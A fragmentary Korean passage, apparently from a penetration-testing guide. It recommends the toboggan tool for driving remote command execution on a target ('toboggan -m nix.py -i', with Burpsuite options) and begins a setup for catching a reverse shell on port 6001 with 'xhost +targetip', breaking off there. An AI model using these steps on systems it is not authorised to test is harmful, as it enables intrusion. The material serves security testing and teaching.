...
이 목적에 추천되는 도구는 [toboggan](https://github.com/n3rada/toboggan.git)으로, 대상 환경과의 상호작용을 단순화합니다.
...
toboggan -m nix.py -i
```
직접적으로 인터랙티브 셸을 활용하려면 `-b`를 추가하여 Burpsuite 통합을 할 수 있으며, 더 기본적인 rce 래퍼를 위해 `-i`를 제거할 수 있습니다.
...
```
역방향 셸을 잡기 위해 사용할 수 있는 것(포트 6001에서 수신 대기할 것):
```bash
# Authorize host
xhost +targetip
# Listen
